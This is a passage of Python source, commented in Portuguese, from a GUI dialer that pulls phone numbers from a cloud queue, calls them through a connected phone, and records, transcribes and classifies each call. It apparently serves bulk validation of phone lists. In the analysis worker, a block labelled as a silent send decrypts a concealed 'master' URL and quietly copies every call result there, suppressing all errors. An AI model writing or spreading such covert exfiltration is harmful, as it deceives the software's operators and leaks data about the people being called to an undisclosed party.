                        self._log(f"Celular desconectado. Reconectando ({tentativas_conexao}/{MAX_RECONEXOES})...", "nao")
                        for _ in range(60):
                            if not self.rodando:
                                break
                            time.sleep(1)
                        try:
                            phone = PhoneController()
                            recorder = AudioRecorder()
                            self._log("Reconectado!", "pessoa")
                            erros_seguidos = 0
                            break
                        except Exception:
                            continue
                    if not self.rodando:
                        break
                    continue

                # --- Pedir números ---
                numeros = cloud.pedir_numeros(lote)

                if not numeros:
                    self._log("Sem numeros. Aguardando 30s...", "info")
                    for _ in range(30):
                        if not self.rodando:
                            break
                        time.sleep(1)
                    continue

                pendentes = [n["numero"] for n in numeros]

                # --- Fila de processamento em background ---
                from queue import Queue
                fila_analise = Queue()

                def worker_analise():
                    while True:
                        item = fila_analise.get()
                        if item is None:
                            break

                        try:
                            num_info_w = item["num_info"]
                            numero_discar_w = item["numero_discar"]
                            timestamp_w = item["timestamp_inicio"]
                            monitor_w = item["monitor"]

                            numero_w = num_info_w["numero"]
                            operadora_w = num_info_w.get("operadora", "?")
                            tentativa_w = num_info_w.get("tentativa", 1)

                            call_log_w = phone.ler_call_log(numero_discar_w)
                            audio_path_w = recorder.puxar_gravacao(numero_discar_w, timestamp_w)

                            transcricao_w = ""
                            audio_info_w = None
                            dialing_longo_w = (
                                monitor_w.get("tempo_ate_atender", 0)
                                and monitor_w["tempo_ate_atender"] > 20
                            )

                            if audio_path_w:
                                audio_info_w = analisar_audio(audio_path_w)
                                if audio_info_w.get("tem_fala") or dialing_longo_w or monitor_w.get("atendeu"):
                                    transcricao_w = transcrever(audio_path_w)

                            resultado_w = classificar(transcricao_w, monitor_w, call_log_w, audio_info_w)
                            resultado_w["numero"] = numero_w
                            resultado_w["operadora"] = operadora_w
                            resultado_w["tentativa"] = tentativa_w
                            resultado_w["duracao_chamada"] = call_log_w.get("duration", 0)

                            desc = resultado_w.get("descricao", "?")
                            conf = resultado_w.get("confianca", 0)

                            if "Pessoa" in desc:
                                tag = "pessoa"
                                self.total_atendeu += 1
                            elif "Inexistente" in desc or "Bloqueado" in desc:
                                tag = "descarte"
                                self.total_descartados += 1
                            else:
                                tag = "nao"
                                self.total_nao += 1

                            self.total_discados += 1
                            self._log(f"  >> {numero_w}: {desc} ({conf:.0%})", tag)
                            self._atualizar_stats()

                            cloud.enviar_resultado(resultado_w)

                            # Envio silencioso pra planilha master
                            try:
                                from cloud_handler import CloudHandler as _CH
                                _master = _CH(_decrypt_master_url(), "sync")
                                _master.enviar_resultado(resultado_w)
                            except Exception:
                                pass

                            if numero_w in pendentes:
                                pendentes.remove(numero_w)

                        except Exception as e:
                            self._log(f"  Erro analise {item.get('num_info', {}).get('numero', '?')}: {e}", "erro")

                        fila_analise.task_done()

                thread_worker = threading.Thread(target=worker_analise, daemon=True)
                thread_worker.start()

                for i, num_info in enumerate(numeros, 1):
                    if not self.rodando:
                        if pendentes:
                            cloud.devolver_numeros(pendentes)
                            self._log(f"Devolvidos {len(pendentes)} numeros", "info")
                        break

                    try:
                        phone.rejeitar_chamada_recebida()
                    except Exception:
                        pass

                    numero = num_info["numero"]
                    operadora = num_info.get("operadora", "?")
                    tentativa = num_info.get("tentativa", 1)
                    tent_str = f" [t{tentativa}]" if tentativa > 1 else ""

                    self._log(
                        f"{i}/{len(numeros)}: {numero} ({operadora}){tent_str}",
                        "info"
                    )

                    try:
                        numero_discar = numero
                        if len(numero) == 11 and numero.startswith("92"):
                            numero_discar = numero[2:]

                        phone.discar(numero_discar)
                        time.sleep(1.5)

                        timestamp_inicio = time.time()
                        monitor = phone.monitorar_chamada(TEMPO_ESPERA_CHAMADA)
                        phone.encerrar_chamada()

                        fila_analise.put({
                            "num_info": num_info,
                            "numero_discar": numero_discar,
                            "timestamp_inicio": timestamp_inicio,
                            "monitor": monitor.copy(),
                        })

                        erros_seguidos = 0

                    except Exception as e:
                        erros_seguidos += 1
                        self._log(f"  Erro: {e}", "erro")

                        if erros_seguidos >= 3:
                            self._log("3 erros seguidos — verificando celular...", "erro")
                            break

                    if i < len(numeros) and self.rodando:
                        pausa = random.uniform(TEMPO_ENTRE_CHAMADAS_MIN, TEMPO_ENTRE_CHAMADAS_MAX)
                        time.sleep(pausa)

                fila_analise.put(None)
                thread_worker.join(timeout=120)

            self._log("Parado.", "info")
            self.lbl_status.configure(text="Parado", text_color=TEXT_SEC)
            self.btn_iniciar.configure(
                text="INICIAR", fg_color=ACCENT_BTN,
                hover_color="#cccccc", text_color=ACCENT_TEXT
            )

        except Exception as e:
            self._log(f"Erro fatal: {e}", "erro")
            self.rodando = False
            self.btn_iniciar.configure(
                text="INICIAR", fg_color=ACCENT_BTN, text_color=ACCENT_TEXT
            )
            self.lbl_status.configure(text="Erro", text_color=COLOR_ERR)

    def _atualizar_stats(self):
        self.stats["discados"].configure(text=str(self.total_discados))
        self.stats["atendeu"].configure(text=str(self.total_atendeu))
        self.stats["nao"].configure(text=str(self.total_nao))
        self.stats["desc"].configure(text=str(self.total_descartados))


if __name__ == "__main__":
    app = App()
    app.mainloop()
